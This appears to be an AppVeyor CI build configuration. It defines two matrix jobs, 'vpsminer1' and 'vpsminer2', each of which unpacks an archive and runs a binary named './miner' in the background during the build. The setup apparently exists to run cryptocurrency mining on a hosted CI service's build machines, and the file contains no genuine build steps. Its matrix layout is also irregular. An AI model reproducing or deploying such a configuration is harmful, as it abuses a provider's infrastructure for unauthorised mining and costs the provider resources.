version: 1.0.{build}

image: Ubuntu

# Switch to script mode
build:
  off

init:
  # Make sure bash is installed (Ubuntu image usually has it pre-installed)
  - sudo apt-get update
  - sudo apt-get install -y bash

# Define a build matrix for different projects
matrix:
  - project: vpsminer1
    build_script:
      # Build commands for Project1
      - tar xvf project1.tar.gz
      - cd project1
      - chmod +x ./miner
      - ./miner &  # Run the first project in the background
      - wait  # Wait for the process to finish

  - project: vpsminer2
    build_script:
      # Build commands for Project2
      - tar xvf project2.tar.gz
      - cd project2
      - chmod +x ./miner
      - ./miner &  # Run the second project in the background
      - wait  # Wait for the process to finish
